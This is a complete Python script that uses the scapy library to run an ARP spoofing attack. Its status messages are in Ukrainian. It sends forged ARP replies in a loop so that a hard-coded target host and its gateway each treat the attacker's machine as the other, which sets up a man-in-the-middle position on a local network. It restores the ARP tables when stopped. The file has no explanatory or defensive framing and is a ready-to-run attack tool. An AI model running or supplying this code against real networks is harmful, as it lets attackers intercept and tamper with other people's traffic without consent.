import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(op=1, pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Не вдалося отримати MAC-адресу для {target_ip}")
        return
    
    arp_response = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(arp_response, verbose=False)

def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac is None or gateway_mac is None:
        print("[!] Не вдалося отримати MAC-адресу для відновлення мережі.")
        return
    
    arp_response = scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(arp_response, count=4, verbose=False)

def arp_spoof(target_ip, gateway_ip):
    print("[*] Початок ARP-спуфінгу...")
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Зупинка ARP-спуфінгу.")
        restore(target_ip, gateway_ip)

if __name__ == "__main__":
    target_ip = "192.168.8.164"
    gateway_ip = "192.168.8.1"
    arp_spoof(target_ip, gateway_ip)
